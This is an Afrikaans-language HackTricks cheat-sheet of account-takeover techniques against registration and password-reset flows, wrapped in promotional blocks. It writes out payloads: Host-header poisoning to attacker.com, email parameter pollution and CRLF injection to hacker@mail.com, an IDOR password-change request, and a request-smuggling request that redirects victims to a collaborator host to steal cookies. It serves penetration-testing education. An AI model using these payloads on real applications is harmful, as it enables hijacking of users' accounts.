# Registrasie- en Oornamekwesbaarhede

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is 'n **donkerweb**-aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kli√´nte deur **steelmalware** gekompromitteer is.

Die prim√™re doel van WhiteIntel is om rekeningoorname en lospryse-aanvalle te beveg wat voortspruit uit inligtingsteelmalware.

Jy kan hul webwerf besoek en hul enjin gratis probeer by:

{% embed url="https://whiteintel.io" %}

---

## Registrasie-oornaamname

### Duplikaat Registrasie

* Probeer genereer met 'n bestaande gebruikersnaam
* Kontroleer variasie in die e-pos:
  * hoofletters
  * \+1@
  * voeg 'n paar punte by in die e-pos
  * spesiale karakters in die e-posnaam (%00, %09, %20)
  * Plaas swart karakters na die e-pos: `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### Gebruikersnaam Enumerasie

Kyk of jy kan uitvind wanneer 'n gebruikersnaam reeds binne die aansoek geregistreer is.

### Wagwoordbeleid

Skep 'n gebruiker en kyk na die wagwoordbeleid (kyk of jy swak wagwoorde kan gebruik).\
In daardie geval kan jy probeer om geloofsbriewe te bruteforce.

### SQL-inspuiting

[Kyk na hierdie bladsy](sql-injection/#insert-statement) om te leer hoe om rekeningoorname te probeer of inligting te onttrek via **SQL-inspuitings** in registrasievorms.

### Oauth-oornames

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML-kwesbaarhede

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Verander E-pos

Wanneer geregistreer, probeer om die e-pos te verander en kyk of hierdie verandering korrek gevalideer word of dit na willekeurige e-posse kan verander.

### Meer Kontroles

* Kyk of jy **weggooi-e-posse** kan gebruik
* **Lang** **wagwoord** (>200) lei tot **DoS**
* **Kyk na tempo-limiete op rekening-skepping**
* Gebruik username@**burp\_collab**.net en analiseer die **terugroep**

## **Wagwoord-terugstel-oornaamname**

### Wagwoord-terugstel-tokenlek via Verwysing <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Versoek wagwoord-terugstel na jou e-posadres
2. Klik op die wagwoord-terugstel skakel
3. Verander nie wagwoord nie
4. Klik op enige 3de party-webwerwe (bv: Facebook, twitter)
5. Onderskep die versoek in Burp Suite-proksi
6. Kyk of die verwysingskop wagwoord-terugstelteken lek.

### Wagwoord-terugstelvergiftiging <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Onderskep die wagwoord-terugstelversoek in Burp Suite
2. Voeg of wysig die volgende koppe in Burp Suite by: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Stuur die versoek met die gewysigde kop\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Soek na 'n wagwoord-terugstelskakel gebaseer op die _host-kop_ soos: `https://attacker.com/reset-password.php?token=TOKEN`

### Wagwoord-terugstel via E-posparameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR op API-parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Aanvaller moet inlog met hul rekening en na die **Wagwoord verander**-funksie gaan.
2. Begin die Burp Suite en Onderskep die versoek
3. Stuur dit na die herhalingskategorie en wysig die parameters: Gebruiker-ID/e-pos\
`powershell POST /api/changepass [...] ("vorm": {"e-pos":"slagoffer@e-pos.com","wagwoord":"veilige wagwoord"})`

### Swak Wagwoord-herstelteken <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Die wagwoord-herstelteken moet ewekansig gegenereer word en elke keer uniek wees.\
Probeer bepaal of die teken verval of altyd dieselfde is, in sommige gevalle is die genereringsalgoritme swak en kan geraden word. Die volgende veranderlikes kan deur die algoritme gebruik word.

* Tydstempel
* Gebruiker-ID
* E-pos van Gebruiker
* Voornaam en Van
* Geboortedatum
* Kriptografie
* Slegs nommers
* Klein tekenreeks (karakters tussen \[A-Z,a-z,0-9])
* Tekenhergebruik
* Tekenvervaldatum

### Uitlek van Wagwoord-herstelteken <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger 'n wagwoord-herstelversoek deur die API/UI vir 'n spesifieke e-pos bv: toets@pos.com
2. Inspekteer die bedienerreaksie en soek na `resetToken`
3. Gebruik dan die teken in 'n URL soos `https://voorbeeld.com/v3/gebruiker/wagwoord/herstel?resetToken=[DIE_RESET_TEKEN]&e-pos=[DIE_POS]`

### Wagwoord-herstel via Gebruikersnaam-botsing <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registreer op die stelsel met 'n gebruikersnaam identies aan die slagoffer se gebruikersnaam, maar met spasies ingevoeg voor en/of na die gebruikersnaam. bv: `"admin "`
2. Vra 'n wagwoordherstel met jou skadelike gebruikersnaam aan.
3. Gebruik die teken wat na jou e-pos gestuur is en herstel die slagoffer se wagwoord.
4. Koppel aan die slagoffer se rekening met die nuwe wagwoord.

Die platform CTFd was vatbaar vir hierdie aanval.\
Sien: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Rekening-oorneem via Kruiswebkripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Vind 'n XSS binne die aansoek of 'n subdomein as die koekies toegespits is op die ouer domein: `*.domein.com`
2. Laat die huidige **sessiekoekie** uitlek
3. Verifieer as die gebruiker deur die koekie

### Rekening-oorneem via HTTP-versoeksmokkel <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Gebruik **smuggler** om die tipe HTTP-versoeksmokkeling (CL, TE, CL.TE) op te spoor\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Stel 'n versoek op wat die `POST / HTTP/1.1` sal oorskryf met die volgende data:\
`GET http://iets.burpcollaborator.net HTTP/1.1 X:` met die doel om die slagoffers na burpcollab te omskakel en hul koekies te steel\
3\. Die finale versoek kan so lyk as volg:
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### Rekening Oorname via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Skep 'n lading vir die CSRF, bv: "HTML-vorm met outomatiese indiening vir 'n wagwoordverandering"
2. Stuur die lading

### Rekening Oorname via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token kan gebruik word om 'n gebruiker te verifieer.

* Wysig die JWT met 'n ander Gebruiker-ID / E-pos
* Kyk vir swak JWT-handtekening

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Verwysings

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is 'n **donker-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kli√´nte deur **diewe malware** gekompromitteer is.

Die prim√™re doel van WhiteIntel is om rekeningoorname en lospryse-aanvalle te beveg wat voortspruit uit inligtingsteel-malware.

Jy kan hul webwerf besoek en hul enjin **gratis** probeer by:

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
